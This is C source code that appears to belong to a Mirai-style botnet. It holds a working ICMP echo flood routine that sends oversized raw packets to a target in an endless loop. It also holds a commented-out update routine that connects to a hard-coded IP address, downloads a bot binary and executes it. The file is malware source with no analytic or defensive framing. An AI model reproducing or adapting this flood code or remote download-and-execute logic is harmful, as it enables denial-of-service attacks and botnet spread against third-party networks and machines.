#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/wait.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>

#include <netinet/ip_icmp.h>

#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "table.h"
#include "util.h"
#include "scanner.h"
#include "signal.h"

unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
    register long sum;
    u_short oddbyte;
    register u_short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *) & oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;

    return (answer);
}

void attack_icmpecho(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    #ifdef DEBUG
    printf("ICMP Echo Flood\n");
    #endif

    unsigned long daddr;
    unsigned long saddr;
    int payload_size = 0, i, sent, sent_size;

    for (i = 0; i < targs_len; i++)
    {
        daddr = targs[i].addr;
    }
    saddr = util_local_addr();
    int increase_size = rand_next() % 299;
    int start_size = 1400;
    int r;
    payload_size = start_size + increase_size;
    
    int sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
    
    if (sockfd < 0) 
    {
        exit (1);
    }
    
    int on = 1;
    
    // We shall provide IP headers
    if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof (on)) == -1) 
    {
        //perror("setsockopt");
        exit (1);
    }
    
    //allow socket to send datagrams to broadcast addresses
    if (setsockopt (sockfd, SOL_SOCKET, SO_BROADCAST, (const char*)&on, sizeof (on)) == -1) 
    {
        exit(1);
    }   
    
    //Calculate total packet size
    int packet_size = sizeof (struct iphdr) + sizeof (struct icmphdr) + payload_size;
    char *packet = (char *) malloc (packet_size);
                   
    if (!packet) 
    {
        close(sockfd);
        exit (1);
    }
    
    //ip header
    struct iphdr *ip = (struct iphdr *) packet;
    struct icmphdr *icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));
    
    //zero out the packet buffer
    memset (packet, 0, packet_size);

    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons (packet_size);
    ip->id = rand();
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_ICMP;
    ip->saddr = saddr;
    ip->daddr = daddr;
    //ip->check = in_cksum ((u16 *) ip, sizeof (struct iphdr));

    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.sequence = rand();
    icmp->un.echo.id = rand();
    //checksum
    icmp->checksum = 0;
    
    struct sockaddr_in servaddr;
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = daddr;
    memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));

    while (1)
    {
        memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, payload_size);
        
        //recalculate the icmp header checksum since we are filling the payload with random characters everytime
        icmp->checksum = 0;
        icmp->checksum = in_cksum((unsigned short *)icmp, sizeof(struct icmphdr) + payload_size);
        
        if ( (sent_size = sendto(sockfd, packet, packet_size, 0, (struct sockaddr*) &servaddr, sizeof (servaddr))) < 1) 
        {
            break;
        }
        
        usleep(5000);
    }
    free(packet);
    close(sockfd);
    
}


void update_process(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
/*
    #ifdef DEBUG
    printf("UPDATE!\n");
    #endif
   

    //char *id_buf = "dbg";
     int socket_desc;
    unsigned int header_parser = 0;
    char message[30];
    char final[100];
    char final2[100];
    char server_reply[128];
    char *filename = "updateproc";
    int total_len = 0;
    int status = 0;

    int len; 

    int file;
    struct sockaddr_in server;

    //Create socket
    socket_desc = socket(AF_INET , SOCK_STREAM , 0);
    if (socket_desc == -1)
    {
        //printf("Could not create socket");
    }

    server.sin_addr.s_addr = INET_ADDR(185,172,110,235);
    server.sin_family = AF_INET;
    server.sin_port = htons( 80 );

    //Connect to remote server
    if (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0)
    {
        //puts("connect error");
        return;
    }

    #ifdef DEBUG
    printf("connected\n");
    #endif

    //Send request
    //message = "GET /dbg HTTP/1.0\r\n\r\n";

     file_desc = open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0777);

    if (file_desc == -1)
    {
        #ifdef DEBUG
        printf("open() err\n");
        #endif
        close(socket_desc);
    }
    

    if( write(socket_desc , "GET /" ARCH " HTTP/1.0\r\n\r\n" , strlen("GET /" ARCH " HTTP/1.0\r\n\r\n")) != strlen("GET /" ARCH " HTTP/1.0\r\n\r\n"))
    {
        //printf("write failed");
        close(socket_desc);
        close(file_desc);
        return;
    }

    #ifdef DEBUG
    printf("Data Send\n"); 
    #endif

    while (header_parser != 0x0d0a0d0a)
    {
        char ch;
        int ret = read(socket_desc, &ch, 1);

        if (ret != 1)
        {
            close(socket_desc);
            close(file_desc);
            return;
        }

        header_parser = (header_parser << 8) | ch;
    }


    #ifdef DEBUG
    printf("finished recv http header\n");
    #endif



    while(1)
    {
        int received_len = read(socket_desc, server_reply, sizeof (server_reply));

        total_len += received_len;

        if (received_len <= 0)
            break;

        write(file_desc, server_reply, received_len);
        #ifdef DEBUG
        printf("\nReceived byte size = %d\nTotal lenght = %d", received_len, total_len);
        #endif

    }

    #ifdef DEBUG
    printf("fin.\n");
    #endif

    rename("updateproc", "bot." ARCH);

    //teardown_connection();
    int pid;
    pid = fork();
    
    if(pid == -1) // Fork error?
    {
        close(file_desc);
        return;
    }

    if(pid == 0)
    {
        execl("bot." ARCH, "update." ARCH, NULL);
        exit(0);
    }

    waitpid(pid, &status, 0);

    close(socket_desc);
    return;
*/
}


